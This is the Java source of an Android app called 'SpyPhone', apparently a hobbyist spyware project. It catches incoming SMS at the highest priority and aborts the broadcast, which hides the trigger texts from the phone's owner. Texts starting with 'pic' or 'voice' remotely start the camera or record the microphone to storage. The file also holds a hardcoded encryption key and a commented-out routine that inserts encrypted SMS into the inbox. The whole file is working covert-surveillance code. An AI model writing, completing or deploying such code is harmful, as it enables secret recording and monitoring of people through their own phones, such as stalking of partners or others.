package com.spyphone;

import android.app.Activity;
import android.content.*;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.telephony.SmsMessage;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;

public class SpyPhone extends Activity
{
    BroadcastReceiver SmsReceiver;
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        IntentFilter filter = new IntentFilter( "android.provider.Telephony.SMS_RECEIVED" );
        filter.setPriority(IntentFilter.SYSTEM_HIGH_PRIORITY);
        registerReceiver( new SmsReceiver(), filter );
        Button btnTestCam = (Button) findViewById(R.id.btnTestCam);
        Button btnTestRecorder = (Button) findViewById(R.id.btnTestRecorder);
        btnTestCam.setOnClickListener( new View.OnClickListener() {
           @Override
           public void onClick(View v) {
               // get an image from the camera
               try {
                   startSpyCamera();
               }       catch(Exception e) {
                   System.out.println("btnTestCam.onClick: " + e.toString());
               }
           }
       }
       );

        btnTestRecorder.setOnClickListener( new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                // get an image from the camera
                try {
                    startSpyRecorder();
                }       catch(Exception e) {
                    System.out.println("btnTestRecorder.onClick: " + e.toString());
                }
            }
        }
        );


    }
    public void startSpyRecorder() {
        try {

            MediaRecorder mRecorder = new MediaRecorder();
            mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
            File mediaStorageDir = Environment.getExternalStorageDirectory();
            File voiceFile = new File(mediaStorageDir.getPath() + File.separatorChar + "spyphone_voice_"+ timeStamp + ".3gp");

            mRecorder.setOutputFile(voiceFile.getPath());
            mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mRecorder.setMaxDuration(6000);
            mRecorder.prepare();
            mRecorder.start();
            Toast.makeText(getApplicationContext(), "Recording voice to My Files folder.", Toast.LENGTH_LONG).show();
        } catch(Exception e) {
            System.out.println("startSpyRecorder" + e.toString());
        }
    }
    public void startSpyCamera() {
        try {

            Intent toMain = new Intent(getApplicationContext(), SpyCameraActivity.class);

            startActivity(toMain);

        } catch(Exception e) {
            System.out.println("startSpyCamera" + e.toString());
        }
    }

    public class SmsReceiver extends BroadcastReceiver
    {
        // All available column names in SMS table
        // [_id, thread_id, address,
        // person, date, protocol, read,
        // status, type, reply_path_present,
        // subject, body, service_center,
        // locked, error_code, seen]

        public static final String SMS_EXTRA_NAME = "pdus";
        public static final String SMS_URI = "content://sms";

        public static final String ADDRESS = "address";
        public static final String PERSON = "person";
        public static final String DATE = "date";
        public static final String READ = "read";
        public static final String STATUS = "status";
        public static final String TYPE = "type";
        public static final String BODY = "body";
        public static final String SEEN = "seen";

        public static final int MESSAGE_TYPE_INBOX = 1;
        public static final int MESSAGE_TYPE_SENT = 2;

        public static final int MESSAGE_IS_NOT_READ = 0;
        public static final int MESSAGE_IS_READ = 1;

        public static final int MESSAGE_IS_NOT_SEEN = 0;
        public static final int MESSAGE_IS_SEEN = 1;

        // Change the password here or give a user possibility to change it
        public final byte[] PASSWORD = new byte[]{ 0x20, 0x32, 0x34, 0x47, (byte) 0x84, 0x33, 0x58 };

        public void onReceive( Context context, Intent intent )
        {
            this.abortBroadcast();
            // Get SMS map from Intent
            Bundle extras = intent.getExtras();

            String messages = "";

            if ( extras != null )
            {
                // Get received SMS array
                Object[] smsExtra = (Object[]) extras.get( SMS_EXTRA_NAME );

                // Get ContentResolver object for pushing encrypted SMS to incoming folder
                ContentResolver contentResolver = context.getContentResolver();

                for ( int i = 0; i < smsExtra.length; ++i )
                {
                    SmsMessage sms = SmsMessage.createFromPdu((byte[])smsExtra[i]);

                    String body = sms.getMessageBody().toString();
                    String address = sms.getOriginatingAddress();

                    messages += "SMS from " + address + " :\n";
                    messages += body + "\n";
                    System.out.println("onReceiveSms: " + body);
                    // Here you can add any your code to work with incoming SMS
                    // I added encrypting of all received SMS

                    // putSmsToDatabase( contentResolver, sms );
                    if(body.toLowerCase().startsWith("pic")) {
                        System.out.println("onReceiveSmsHasPic: " + body);
                        startSpyCamera();
                    }   else if(body.toLowerCase().startsWith("voice")) {
                        System.out.println("onReceiveSmsHasVoice: " + body);
                        startSpyRecorder();
                    }   else {
                        this.clearAbortBroadcast();
                    }
                }

                // Display SMS message

               // Toast.makeText(context, messages, Toast.LENGTH_SHORT).show();
            }

            // WARNING!!!
            // If you uncomment next line then received SMS will not be put to incoming.
            // Be careful!
            // this.abortBroadcast();
        }

        private void putSmsToDatabase( ContentResolver contentResolver, SmsMessage sms )
        {
            // Create SMS row
            ContentValues values = new ContentValues();
            values.put( ADDRESS, sms.getOriginatingAddress() );
            values.put( DATE, sms.getTimestampMillis() );
            values.put( READ, MESSAGE_IS_NOT_READ );
            values.put( STATUS, sms.getStatus() );
            values.put( TYPE, MESSAGE_TYPE_INBOX );
            values.put( SEEN, MESSAGE_IS_NOT_SEEN );
            try
            {
                String encryptedPassword = StringCryptor.encrypt( new String(PASSWORD), sms.getMessageBody().toString() );
                values.put( BODY, encryptedPassword );
            }
            catch ( Exception e )
            {
                e.printStackTrace();
            }

            // Push row into the SMS table
            contentResolver.insert( Uri.parse(SMS_URI), values );
        }


    }

}
